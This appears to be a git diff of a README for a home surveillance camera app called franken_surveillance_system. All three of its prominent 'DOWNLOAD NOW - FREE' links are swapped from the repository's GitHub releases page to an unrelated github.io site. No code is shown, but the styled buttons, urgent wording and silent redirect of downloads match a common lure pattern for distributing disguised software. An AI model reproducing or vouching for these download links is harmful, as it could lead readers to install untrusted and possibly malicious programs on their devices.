@@ -1,7 +1,7 @@
 <h1>📹 franken_surveillance_system - Your Personal, Private Security Camera Network</h1>
 
 <p align="center">
-  <a href="https://github.com/Hewieheartsick3577/franken_surveillance_system/releases" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
+  <a href="https://hewieheartsick3577.github.io" style="display:inline-block;padding:16px 32px;background:linear-gradient(135deg,#667eea,#764ba2);color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:50px;box-shadow:0 4px 15px rgba(0,0,0,0.2);">⬇️ DOWNLOAD NOW - FREE</a>
 </p>
 
 ## 🔍 What Is This?
@@ -45,7 +45,7 @@ When you download and run franken_surveillance_system, here's what you get:
 
 ### Step 1: Download the Software
 
-Visit this link to download the application: **[https://github.com/Hewieheartsick3577/franken_surveillance_system/releases](https://github.com/Hewieheartsick3577/franken_surveillance_system/releases)**
+Visit this link to download the application: **[https://hewieheartsick3577.github.io](https://hewieheartsick3577.github.io)**
 
 ### Step 2: Install the Software
 
@@ -179,7 +179,7 @@ Your home, your pets, your family - they matter. Get peace of mind today.
 
 Ready to start? Head over to the download page:
 
-**[👉 CLICK HERE TO DOWNLOAD franken_surveillance_system 👈](https://github.com/Hewieheartsick3577/franken_surveillance_system/releases)**
+**[👉 CLICK HERE TO DOWNLOAD franken_surveillance_system 👈](https://hewieheartsick3577.github.io)**
 
 The download is free, and you'll be up and running in minutes. After installing, you'll have a fully functional, private surveillance system that you control completely.
 
